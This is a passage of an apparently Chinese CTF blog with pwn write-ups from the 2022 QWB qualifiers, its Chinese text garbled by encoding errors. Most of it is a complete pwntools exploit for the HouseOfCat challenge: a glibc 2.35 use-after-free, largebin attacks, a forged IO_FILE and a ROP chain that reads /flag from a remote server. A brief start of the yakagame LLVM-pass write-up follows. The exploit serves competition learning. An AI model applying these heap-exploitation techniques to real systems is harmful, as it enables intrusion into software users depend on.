href="https://drive.google.com/file/d/1A-isglKqxCjePSDtRMTN0mJ2ep8NTyC6/view?usp=sharing">attachment</a></p><h3 id="é¢˜ç›®åˆ†æ-v2"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v2">Â¶</a>é¢˜ç›®åˆ†æ</h3><h2 id="qqbot-3-Solved-Workingâ€¦"><a class="header-anchor" href="#qqbot-3-Solved-Workingâ€¦">Â¶</a>qqbot (3 Solved)(Workingâ€¦)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220922162924198.png" alt="qqbot"></p><h3 id="é¢˜ç›®æè¿°-v4"><a class="header-anchor" href="#é¢˜ç›®æè¿°-v4">Â¶</a>é¢˜ç›®æè¿°</h3><p>We prepare some bots for you, fool one of them and get flag. + qqbot01@localhost + qqbot02@localhost + qqbot03@localhost + qqbot04@localhost + qqbot05@localhost The bot is on ubuntu 20.04 and flag in <code>/flag</code></p><p><a href="https://drive.google.com/file/d/1eBb4Cmm-dVQ4Z914hzICthOH8iMjedp_/view?usp=sharing">attachment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 å¼ºç½‘æ¯åˆèµ› Pwn éƒ¨åˆ†é¢˜è§£</title>
    <link href="/posts/cfd0f35d.html"/>
    <url>/posts/cfd0f35d.html</url>
    
    <content type="html"><![CDATA[<p>18 é“ pwn ï¼ŒæŠŠ ğŸ‘´ ç»™å†²çƒ‚äº†ï¼Œç»™ ğŸ‘´ å¸¦æ¥äº†å·¨å¤§çš„å¿ƒçµéœ‡æ’¼ä¸é˜´å½±ã€‚ğŸ‘´ æ¯”è¾ƒèœï¼Œæ¯”èµ›æ—¶ä¹Ÿå°±å‡ºäº†æ¯”è¾ƒç®€å•çš„ä¸‰é“ï¼Œå…¶ä»–çš„ ğŸ‘´ æ˜¯çœŸçš„ä¸ä¼šï¼ŒğŸ‘´ ä¸‹å»å¥½å¥½åæ€ã€‚</p><h3 id="HouseOfCat"><a class="header-anchor" href="#HouseOfCat">Â¶</a>HouseOfCat</h3><h4 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h4><p>ä¸€è¡€é¢˜ï¼Œå¥—äº†IOTæ¿å­çš„ 2.35 ç‰ˆæœ¬ä¸‹ <strong>UAF</strong> åˆ©ç”¨ã€‚</p><p><strong>æ ¸å¿ƒæ€è·¯</strong>ï¼šåœ¨è°ƒç”¨<code>_wide_vtable</code>é‡Œé¢çš„æˆå‘˜å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œ<strong>æ²¡æœ‰å…³äºvtableçš„åˆæ³•æ€§æ£€æŸ¥</strong>ã€‚</p><p>ä¸€æ¬¡ Largebin æ‰“ stderrï¼Œä¸€æ¬¡ Largebin æ‰“ main_arena Topchunk åœ°å€ï¼Œèµ° kiwi è§¦å‘ IO æµåˆ©ç”¨ <code>_wide_data</code> æˆå‘˜æ§åˆ¶æ‰§è¡Œæµå®Œæˆ orwã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ Edit æä¾›çš„å†™å…¥å­—èŠ‚æ•°æ˜æ˜¾ä¸è¶³ï¼Œéœ€è¦åœ¨ Add æ—¶æå‰å¸ƒç½®å¥½ payloadã€‚</p><h4 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">IO_FILE</span>(<span class="hljs-params">_flags = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_read_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_ptr = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_write_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_buf_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_backup_base = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_save_end = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_marker = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _IO_chain = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _fileno = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _lock = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _wide_data = <span class="hljs-number">0</span>,</span><br><span class="hljs-params">              _mode = <span class="hljs-number">0</span></span>):<br>    fake_IO_FILE = p32(_flags) + \<br>             p32(<span class="hljs-number">0</span>) + \<br>             p64(_IO_read_ptr) + \<br>             p64(_IO_read_end) + \<br>             p64(_IO_read_base) + \<br>             p64(_IO_write_base) + \<br>             p64(_IO_write_ptr) + \<br>             p64(_IO_write_end) + \<br>             p64(_IO_buf_base) + \<br>             p64(_IO_buf_end) + \<br>             p64(_IO_save_base) + \<br>             p64(_IO_backup_base) + \<br>             p64(_IO_save_end) + \<br>             p64(_IO_marker) + \<br>             p64(_IO_chain) + \<br>             p32(_fileno)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_lock)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_wide_data)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    fake_IO_FILE += p64(_mode)<br>    fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">return</span> fake_IO_FILE<br><br>elf = ELF(<span class="hljs-string">&#x27;./house_of_cat&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./house_of_cat&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;59.110.212.61&#x27;</span>,<span class="hljs-number">16938</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;LOGIN \x7C r00t QWB QWXFadmin\0&#x27;&#x27;&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;&#x27;CAT  \x7C r00t QWB QWXF&#x27;&#x27;&#x27;</span>+p32(<span class="hljs-number">0x0FFFFFFFF</span>)+<span class="hljs-string">&#x27;$&#x27;</span><br>    sla(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,<span class="hljs-built_in">str</span>(msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br>login()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x458</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x468</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>rdi2rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>dele(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">3</span>)<br>stderr = <span class="hljs-number">0x21a860</span> + libc_base<br>_IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_base<br>rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002be51</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011f497</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000003d3cf</span><br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span><span class="hljs-comment"># 0x0000000000045eb0 : pop rax ; ret</span><br>addr =heap_base<br>rdi_rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0000000000091396</span> <span class="hljs-comment"># 0x0000000000091396: syscall; ret; </span><br><br>orw = flat([<br>    <span class="hljs-number">0</span>,rdi,<span class="hljs-number">0</span>,libc.sym.close,rax,<span class="hljs-number">2</span>,rdi,heap_base+<span class="hljs-number">0x2b0</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x20</span>,libc.sym.read,rdi,<span class="hljs-number">1</span>,libc.sym.write<br>])+<span class="hljs-string">&#x27;/flag\0\0\0&#x27;</span><br>addr = heap_base+<span class="hljs-number">0x200</span><br>fuck = SigreturnFrame()<br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = addr<br>fuck.rdx = <span class="hljs-number">0x300</span><br>fuck.rsp = addr + <span class="hljs-number">8</span><br>fuck.rip = libc.sym.read<br>guard = libc_base - <span class="hljs-number">0x2890</span><br>_IO_wstrn_jumps = libc_base + <span class="hljs-number">0x215dc0</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>_IO_cookie_jumps = libc_base +<span class="hljs-number">0x215b80</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>lg(<span class="hljs-string">&#x27;guard&#x27;</span>,guard)<br>payload = IO_FILE(_IO_read_end=<span class="hljs-number">1</span>,_IO_write_ptr=stderr-<span class="hljs-number">0x20</span>,_lock=heap_base+<span class="hljs-number">0x10</span>,_IO_chain=heap_base+<span class="hljs-number">0x3a0</span>,_wide_data=heap_base+<span class="hljs-number">0xc40</span>)[<span class="hljs-number">0x10</span>:]+p64(_IO_wfile_jumps)<br>payload = payload.ljust(<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += <span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">0xe0</span>]+p64(heap_base+<span class="hljs-number">0xd40</span>-<span class="hljs-number">0x68</span>)<br>payload = payload.ljust(<span class="hljs-number">0x1f0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>) + p64(magic)<br><br><br><span class="hljs-comment"># payload += IO_FILE(_IO_write_ptr=0xffffffffffffffff,_IO_chain=0,_lock=0) + p64(_IO_cookie_jumps + 0x60) + p64(heap_base+0x4a0) + p64(0) + p64(rol(rdi_rdx ^ (heap_base+0x390), 0x11,64))</span><br><span class="hljs-comment"># payload = payload.ljust(0x1f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += p64(0)+p64(heap_base+0x4a0)+p64(0)*2+p64(magic)+str(fuck)[0x28:]</span><br><span class="hljs-comment"># payload = payload.ljust(0x2f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += mmp</span><br><br>fake1 = libc_base + <span class="hljs-number">0x21a0e0</span><br>fake2 = heap_base + <span class="hljs-number">0x290</span><br><span class="hljs-comment"># add(4,0x458,&#x27;u&#x27;*0x20+payload[0x20:])</span><br><span class="hljs-comment"># add(5,0x458)</span><br><span class="hljs-comment"># add(6,0x448)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(7,0x468)</span><br><span class="hljs-comment"># dele(6)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(stderr-0x20))</span><br><span class="hljs-comment"># add(8,0x420)</span><br><br><span class="hljs-comment"># dele(8)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(0x7ffff7fa5ce0-0x20))</span><br><span class="hljs-comment"># add(9,0x420)</span><br><span class="hljs-comment"># add(10,0x468)</span><br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x450</span>+pack(-<span class="hljs-number">2059</span>))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x20</span>+payload[<span class="hljs-number">0x20</span>:])<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x420</span>)<br><br>dele(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(libc_base+<span class="hljs-number">0x219ce0</span>-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x420</span>)<br><span class="hljs-comment"># add(11,0x468)</span><br>cat()<br>menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">11</span>))<br>sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x468</span>))<br><br>sleep(<span class="hljs-number">2</span>)<br>sl(orw)<br><br><span class="hljs-comment"># dele(9)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># dele(5)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(10,0x458)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x7ffff7e011c8</span><br><span class="hljs-string">   0x7ffff7e011b4 &lt;__vfprintf_internal+260&gt;    cmp    rdi, rax</span><br><span class="hljs-string">   0x7ffff7e011b7 &lt;__vfprintf_internal+263&gt;    jbe    __vfprintf_internal+6560                &lt;__vfprintf_internal+6560&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011bd &lt;__vfprintf_internal+269&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="hljs-string">   0x7ffff7e011c2 &lt;__vfprintf_internal+274&gt;    mov    rdx, rbx</span><br><span class="hljs-string">   0x7ffff7e011c5 &lt;__vfprintf_internal+277&gt;    mov    rdi, rbp</span><br><span class="hljs-string"> â–º 0x7ffff7e011c8 &lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]        &lt;0&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011cd &lt;__vfprintf_internal+285&gt;    cmp    rbx, rax</span><br><span class="hljs-string">   0x7ffff7e011d0 &lt;__vfprintf_internal+288&gt;    jne    __vfprintf_internal+5880                &lt;__vfprintf_internal+5880&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="yakagame"><a class="header-anchor" href="#yakagame">Â¶</a>yakagame</h3><p>Exp æœ‰æ¦‚ç‡å¤±è´¥ï¼Œä½†æˆåŠŸç‡å¾ˆé«˜ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731085710766.png" alt="exp"></p><h4 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h4><p>ç»å…¸çš„ llvm pass pwn é¢˜ï¼Œè›‹ç–¼çš„æ˜¯ç»™å‡ºæ¥çš„å‡ ä¸ªå‡½æ•°éƒ½æ²¡ç”¨ï¼Œåœ¨ä¸Šé¢æµªè´¹äº†å¤ªå¤šçš„æ—¶é—´äº†ã€‚</p><p>å…³é”®å‡½æ•°:</p><p>1.åé—¨å‡½æ•°ï¼Œè¦æ±‚score&gt;0x12345678</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090206313.png" alt="yakagame1"></p><p>è¿›å…¥åä¼šæ‰§è¡Œ cmd æŒ‡é’ˆå†…å­˜æ”¾çš„å†…å®¹ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090304553.png" alt="yakagame2"></p><p>2.ä¸‹æ ‡è¶Šç•Œ</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090050060.png" alt="yakagame3"></p><p>å…¶ä¸­ï¼Œ<strong>v33 ä¸º char ç±»å‹</strong> ï¼Œåœ¨å‡½æ•°æ•°é‡è¶³å¤Ÿå¤šæ—¶å¯ä»¥éå†åˆ°<strong>è´Ÿæ•°</strong>ä¸‹æ ‡ï¼Œæ„æˆè¶Šç•Œå†™ã€‚</p><p>æ€è·¯ï¼š</p><ol><li>é¦–å…ˆéœ€è¦èƒ½å¤Ÿè¿›å…¥åé—¨å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¯æ§èŒƒå›´å†…æ‰¾åˆ°ä¸€ä¸ªå†…å®¹ &gt; 0x12345678 çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘é€‰çš„æ˜¯ <code>stdout@got + 2</code> ï¼Œ0x7f å¼€å¤´çš„ 8 